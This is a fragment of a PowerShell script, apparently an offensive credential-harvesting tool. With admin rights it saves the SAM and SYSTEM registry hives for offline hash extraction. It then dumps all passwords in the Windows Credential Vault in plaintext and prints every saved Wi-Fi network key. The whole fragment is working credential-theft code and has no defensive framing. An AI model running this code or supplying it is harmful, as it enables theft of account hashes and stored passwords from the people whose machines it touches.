
   
    if ($sessionadmin -eq "True!!"){

    $exportloc = Read-Host -Prompt "Location for SAM/System file to be extracted to"
    
    if ($exportloc.EndsWith("\") -eq $false){$exportloc = $exportloc + "\"}

    $sam = $exportloc + "sam"
    $sysl = $exportloc + "system"

    reg save hklm\sam $sam
    reg save hklm\system $sysl
    
    
    }else{Write-Output ""; Write-Output "Cannot Extract SAM/SYSTEM File As Running As Non-Admin... Moving On....." }

    
    Write-Output "------------------------"
    Write-Output ""
    Write-Output "Credential Store Passwords Extracted......"

    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $a = @(New-Object Windows.Security.Credentials.PasswordVault); $a.RetrieveAll() | % { $_.RetrievePassword();$_ }


    Write-Output "------------------------"
    Write-Output ""
    Write-Output "Wireless Passwords Extracted......"
    Write-Output ""

    $a = netsh wlan show profile | Select-String -Pattern "All User Profile"; $a = $a-replace "All User Profile","" -replace " :",""; $a = $a.trim()
   
    
    Foreach ($i in $a){

     $b = netsh wlan show profile $i key=clear | Select-String -Pattern "Key Content"

     $b = $b -replace "Key Content","" -replace " :",""

     try{$b = $b.trim(); write-output "Network Name: $i"; Write-Output "Password: $b"; Write-Output ""}catch{ 

     # Do nothing 

      }


      }

       

